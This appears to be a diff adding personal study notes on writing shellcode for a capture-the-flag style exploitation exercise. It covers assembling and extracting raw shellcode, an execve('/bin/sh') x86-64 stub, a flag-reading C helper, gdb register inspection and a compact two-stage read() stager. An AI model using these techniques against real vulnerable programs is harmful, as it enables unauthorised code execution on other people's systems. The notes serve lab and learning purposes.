@@ -1,0 +1,42 @@
+gcc -nostdlib -static shellcode.s -o shellcode-elf
+
+objcopy --dump-section .text=shellcode-raw shellcode-elf
+
+objcopy --dump-section .text=shellcode-raw shellcode-elf
+
+hd shellcode-raw
+
+TO REMEBER: /bin/sh drop's privilages so it's not good to use it...
+We can use:
+	-> catflag.c
+		int main() { sendfile(1, open("flag.txt", 0), 0, 1000); }
+		gcc catflag.c -o catflag
+
+	-> shellcode.s
+		.global _start
+		_start:
+		.intel_syntax noprefix
+			mov rax, 59
+			lea rdi, [rip+binsh]
+			mov rsi, 0
+			mov rdx, 0
+			syscall
+			mov rax, 60
+			syscall
+
+You can check info reg to make sure you don't waste bytes space via mov and stuff:
+	        .global _start
+                _start:
+                .intel_syntax noprefix
+			int3
+
+* gdb BINARY
+* r < shellcode-raw
+* and then info reg and check where is the input ( shellcode ) and that values are in the registers...
+* ~/shelltools/assemble -c "push rdx; pop rsi; xor edi, edi; syscall" > stage1-raw:
+	- on this particularily binary we have the rdx pointing to our input shellcode, rax is set to 0 so...
+	- we push rdx ( rdx -> the lenght we want to read ) and in our case the address of our shellcode
+	- then we pop rsi ( RSP -> RDX ... ... ) so rdx will be in rsi ( rsi -> the message we want to read )
+	- and then for rdi to se it to 0 we just xor it with himself, but not rdi, edi because xor rdi, rdi it's 3 bytes long and we don't have enough space...
+	- then we call syscall
+	- or we can use xchg -> xchange
